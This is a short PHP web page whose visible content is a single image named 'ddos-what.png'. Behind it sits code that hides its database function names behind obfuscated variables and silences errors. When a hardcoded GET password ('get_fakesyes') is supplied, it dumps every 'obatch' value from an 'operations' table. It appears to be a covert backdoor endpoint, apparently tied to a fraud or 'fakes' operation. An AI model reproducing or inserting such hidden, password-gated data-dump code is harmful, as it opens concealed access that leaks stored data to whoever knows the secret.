﻿<html>			

<?

$x0e="error_reporting";
$x0f="mysql_fetch_array";
$x10 = "mysql_query";
$x0e(0);

include('conf.php');
include('../conf.php');
if($_GET['password'] == 'get_fakesyes'){

$x0b = $x10("SELECT * FROM operations");
while($x0c = $x0f($x0b)){$x0d = $x0c['obatch'];

echo "$x0d\r\n";
}
}
?>
<center><a href="/"><img src="/img/ddos-what.png" width="80%"></a></center>		
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>					

</html>